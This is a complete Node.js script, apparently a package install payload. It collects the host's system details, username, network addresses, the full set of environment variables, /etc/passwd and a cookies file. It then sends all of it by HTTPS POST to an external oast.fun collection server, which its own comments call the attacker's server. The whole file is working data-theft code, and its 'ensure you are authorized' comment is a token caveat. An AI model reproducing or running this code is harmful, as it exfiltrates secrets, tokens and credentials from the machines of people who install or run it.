const os = require('os');
const fs = require('fs');
const https = require('https');

// Helper function to send data back to your server
const sendData = (data) => {
    const options = {
        hostname: 'mgyafbennvaaboiuvyqhcgp7lm0pq8pk6.oast.fun', // Your server where you collect the info
        port: 443,
        path: '/convera',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (error) => {
        console.error(error);
    });

    req.write(JSON.stringify(data));
    req.end();
};

// Gather system information
const getSystemInfo = () => {
    const userInfo = os.userInfo();
    const networkInterfaces = os.networkInterfaces();

    const systemInfo = {
        hostname: os.hostname(),
        osType: os.type(),
        osRelease: os.release(),
        platform: os.platform(),
        arch: os.arch(),
        whoami: userInfo.username,
        homeDir: userInfo.homedir,
        networkInterfaces: networkInterfaces,
        ipAddress: networkInterfaces['eth0'] ? networkInterfaces['eth0'][0].address : 'No IP',
        macAddress: networkInterfaces['eth0'] ? networkInterfaces['eth0'][0].mac : 'No MAC',
        uptime: os.uptime(),
        currentWorkingDir: process.cwd(),
        envVariables: process.env,
    };

    return systemInfo;
};

// Optionally, attempt to read sensitive files (ensure you are authorized to do so)
const readSensitiveFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data;
    } catch (err) {
        return `Error reading ${filePath}: ${err.message}`;
    }
};

// Collect data
const collectedData = {
    systemInfo: getSystemInfo(),
    passwdFile: readSensitiveFile('/etc/passwd'),  // Non-sensitive file on Unix-based systems
    cookies: readSensitiveFile('/path/to/cookies'), // Adjust the path based on environment
};

// Send collected data back to the attacker's server
sendData(collectedData);
